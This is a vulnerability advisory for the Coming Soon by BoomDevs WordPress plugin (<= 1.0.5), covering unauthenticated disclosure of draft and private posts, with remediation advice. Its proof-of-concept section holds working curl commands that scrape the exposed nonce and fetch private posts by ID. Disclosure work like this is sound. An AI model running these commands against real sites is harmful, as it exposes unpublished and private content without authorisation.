# Coming Soon by BoomDevs <= 1.0.5 Unauthenticated Disclosure of Draft and Private Posts

## Summary

Coming Soon by BoomDevs <= 1.0.5 exposes an unauthenticated AJAX endpoint that allows visitors to retrieve arbitrary WordPress posts by ID.

A valid AJAX nonce is exposed to unauthenticated users through frontend JavaScript. An attacker can obtain this nonce and invoke the `get_post` AJAX action without authentication to retrieve unpublished content, including draft and private posts.

## Severity

Medium

CVSS v3.1: 5.3

Vector:

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

## Affected Product

Plugin: Coming Soon by BoomDevs

Affected Versions: <= 1.0.5

## Vulnerability Details

The plugin exposes the following JavaScript object to unauthenticated visitors:

```javascript
var csts_content = {
    "ajaxurl":"https://TARGET/wp-admin/admin-ajax.php",
    "action":"get_post",
    "nonce":"EXPOSED_NONCE"
};
```

The plugin also registers an unauthenticated AJAX action:

```php
wp_ajax_nopriv_get_post
```

The handler accepts a user-supplied post ID and returns the complete WordPress post object without validating whether the requested post is publicly accessible.

As a result, an unauthenticated attacker can retrieve unpublished content, including draft and private posts.

## Impact

An unauthenticated attacker can:

* Enumerate post IDs
* Retrieve draft posts
* Retrieve private posts
* Access unpublished content
* Read post titles and contents intended only for authorized users

Depending on site usage, this may disclose sensitive information, internal documentation, unpublished announcements, customer data, or editorial content.

## Proof of Concept

### Step 1: Obtain Public Nonce

```bash
curl -s https://TARGET/ | grep -A3 -B3 get_post
```

Example response:

```html
<script id="csts-js-extra">
var csts_content = {
  "ajaxurl":"https://TARGET/wp-admin/admin-ajax.php",
  "action":"get_post",
  "nonce":"4a32d2ce2f"
};
</script>
```

### Step 2: Retrieve Unpublished Content

```bash
NONCE=$(curl -s https://TARGET/ \
| grep -oE 'csts_content = \{[^}]+\}' \
| grep -oE '"nonce":"[a-f0-9]+"' \
| cut -d'"' -f4)

curl -s -X POST \
"https://TARGET/wp-admin/admin-ajax.php" \
-d "action=get_post" \
-d "nonce=$NONCE" \
-d "id=57"
```

### Example Response

```json
{
  "success": true,
  "post": {
    "ID": 57,
    "post_status": "private",
    "post_title": "PRIVATE_CSTS_TITLE_98765",
    "post_content": "PRIVATE_CSTS_CONTENT_98765"
  }
}
```

### Draft Post Example

```bash
curl -s -X POST \
"https://TARGET/wp-admin/admin-ajax.php" \
-d "action=get_post" \
-d "nonce=$NONCE" \
-d "id=55"
```

Example response:

```json
{
  "success": true,
  "post": {
    "ID": 55,
    "post_status": "draft",
    "post_title": "YMC PRIVATE TEST TITLE 12345",
    "post_content": "YMC PRIVATE TEST CONTENT 67890"
  }
}
```

## Root Cause

The plugin exposes a valid AJAX nonce to unauthenticated users and registers an unauthenticated AJAX handler that retrieves arbitrary posts via `get_post()`.

The handler fails to verify whether the requested post is publicly accessible before returning the full post object.

## Suggested Remediation

* Restrict access to unpublished content.
* Remove the `wp_ajax_nopriv_get_post` action if unauthenticated access is not required.
* Validate post visibility before returning post data.
* Ensure draft and private posts are accessible only to authorized users.
* Return only public posts to unauthenticated visitors.

## CWE

CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

CWE-862: Missing Authorization

## Credits

Discovered and reported by Vaibhav Narkhede.
